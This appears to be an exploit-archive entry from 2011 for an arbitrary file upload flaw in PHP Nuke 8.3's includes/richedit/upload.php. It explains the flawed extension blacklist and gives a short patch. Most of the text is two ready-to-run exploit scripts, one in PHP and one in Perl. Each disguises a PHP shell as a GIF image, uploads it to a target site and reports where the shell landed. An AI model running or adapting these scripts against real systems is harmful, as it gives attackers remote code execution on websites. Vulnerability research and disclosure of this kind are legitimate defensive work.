@@ -1,0 +1,150 @@
+id: 16326
+date: 06/13/2011
+title: PHP Nuke 8.3 MT Arbitrary File Upload Vulnerability
+author: Pentesters.ir
+cves: 
+
+#####################################(Iranian Pentesters Home )####################################
+#          
+# Title    : PHP Nuke 8.3 MT Arbitrary File Upload Vulnerability
+# Author   : Pentesters.ir
+# Exploits Coded by : b3hz4d & 4n0nym0us
+# Tested on: PHP Nuke 8.3
+# Vendor   : http://phpnuke.ir
+# Specially Thanks To: Navid, Hossein, Ahmad, vahid, daryoush and all of the pentesters.ir members
+#
+######################################## Www.Pentesters.Ir ########################################
+
+
+
+
+Vulnerable File : ./includes/richedit/upload.php
+	
+       Vulnerability occures in checking extension section :
+		
+	...
+94.    $blacklist = array(".php", ".phtml", ".php3", ".php4", ".php5", ".php6", ".js", ".shtml", ".pl" ,".py");
+95.    foreach ($blacklist as $file)
+96.   {
+97.    if(preg_match("/$file\$/i", $_FILES['userfile']['name']))
+98.    {
+99.   echo "ERROR: Uploading executable files Not Allowed\n";
+100.    exit;
+101.    }
+102.    }
+	...
+	
+	this section of code checks uploaded file extension with array of executable extensions.in line 97, preg-match() function
+	checks the extension in blacklist array but just checks the name after last dot.so we can't upload files such as file.php but we can rename file
+	to file.php.gif and if we want to upload php file, we should also include image header in file because of image size checking(gif,jpg,png,...)
+	and change the content-type(if necessary).you can rename your php file to something like file.php.01 and then use exploits to upload your php file.
+	
+Patch Solution:
+	
+	 remove "\$" from the preg_match() function
+	
+PHP Exploit :
+
+
+<?php
+///////////////////////////////////////////////////
+#Iranian Pentesters Home
+#PHP Nuke 8.3 MT AFU Vulnerability
+#Coded by:4n0nym0us & b3hz4d
+#http://www.pentesters.ir
+///////////////////////////////////////////////////
+//Settings:
+$address = 'http://your-target.com';
+$file = 'shell.php.01';
+$prefix='pentesters_';
+
+
+//Exploit:
+@$file_data = "\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00";
+@$file_data .= file_get_contents($file);
+file_put_contents($prefix . $file, $file_data);
+$file = $prefix . $file;
+echo "\n" . "///////////////////////////////////" ."\n";
+echo "     Iranian Pentesters Home" . "\n";
+echo " PHP Nuke 8.3 MT RFU Vulnerability" . "\n";
+echo "///////////////////////////////////" ."\n";
+$address_c = $address . '/includes/richedit/upload.php';
+$postdata = array("userfile" => "@$file;type=image/gif","upload" => "1","path" => "images","pwd" => "1");
+$data =  post_data($address_c, $postdata);
+$start = strpos($data, "<img src=\"upload");
+if ($start != null)
+{
+$data = substr($data,$start + 10);
+$end = strpos($data, "\"");
+$data = substr($data,0,$end);
+echo "\n" . "Uploaded File: " . $address . "/includes/richedit/" . $data . "\n";
+}
+else
+echo "\n" . "Upload Failed!!!";
+function post_data($address, $data)
+{
+    $curl = curl_init($address);
+    curl_setopt($curl, CURLOPT_USERAGENT, "Opera/9.0 (Windows NT 5.0; U; en)");
+    curl_setopt($curl, CURLOPT_POST, 1);
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    return $content;
+}
+?>
+
+
+
+
+
+
+Perl Exploit:
+
+
+#!/usr/bin/perl
+###################################################
+#//Iranian Pentesters Home
+#//PHP Nuke 8.3 MT AFU Vulnerability
+#//Coded by:4n0nym0us & b3hz4d
+#//http://www.pentesters.ir
+###################################################
+
+
+use LWP;
+use HTTP::Request::Common;
+print "\n" . "///////////////////////////////////" ."\n";
+print "     Iranian Pentesters Home" . "\n";
+print " PHP Nuke 8.3 MT AFU Vulnerability" . "\n";
+print "///////////////////////////////////" ."\n";
+print "\n" . "Syntax: perl xpl.pl http://your-target.com shell.php.01 [prefix]" . "\n\n";
+my $url   = $ARGV[0]."/includes/richedit/upload.php";
+my $filename = $ARGV[1];
+my $prefix = $ARGV[2];
+my $rfile = $prefix . $filename . ".gif";
+open fhandle, $ARGV[1] or die $!; 
+while (<fhandle>){
+$shell .= $_;
+}
+close fhandle;
+open fhandle, ">", $rfile or die $!;
+print fhandle "\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00"."\n".$shell;
+close(fhandle);
+my $ua = LWP::UserAgent->new;
+$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.12) Gecko/20101026");
+my $req = POST $url, Content_Type => 'form-data',
+	Content      => [
+		upload => "1",
+		path => 'images',
+		pwd => "1",
+		userfile =>  [ $rfile,$prefix . $filename ]
+	];
+my $res = $ua->request($req);
+$between=substr($res->as_string(), index($res->as_string(), '<img src="upload/')+10, index($res->as_string(), 'onclick="self.parent.') - index($res->as_string(), '<img src="upload/')-12);
+print("Uploaded File: " . $ARGV[0]."/includes/richedit/".$between);
+exit;
+
+
+
+#  0day.today [2023-03-21]  #
